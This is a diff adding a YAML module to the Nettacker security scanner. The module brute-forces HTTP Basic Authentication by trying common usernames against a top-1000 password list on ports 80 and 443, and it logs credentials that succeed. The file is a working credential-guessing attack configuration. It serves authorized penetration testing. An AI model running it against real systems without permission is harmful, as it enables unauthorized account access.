@@ -1,0 +1,65 @@
+info:
+  name: http_basic_auth_brute
+  author: Nettacker Team
+  severity: 3
+  description: HTTP Basic Auth Bruteforcer
+  reference: 
+  profiles:
+    - brute
+    - http
+  
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        ssl: false
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization:
+            nettacker_fuzzer:
+              input_format: "Basic {{credentials}}"
+              prefix: 
+              suffix: 
+              interceptors:
+              data:
+                credentials:
+                  nettacker_fuzzer:
+                    input_format: "{{usernames}}:{{passwords}}"
+                    prefix: 
+                    suffix: 
+                    interceptors: base64_encode
+                    data: 
+                      usernames: 
+                        - root
+                        - admin
+                        - user 
+                        - test 
+                      passwords: 
+                        read_from_file: passwords/top_1000_common_passwords.txt
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
+            prefix: 
+            suffix: 
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              paths:
+                - / 
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "^[4-5][0-9][0-9]"
+              reverse: true
+            content:
+              regex: "failed|invalid|incorrect|unauthorized|access denied|try again"
+              reverse: true
+          log: "found credentials -> response_dependent['authorization_basic']"
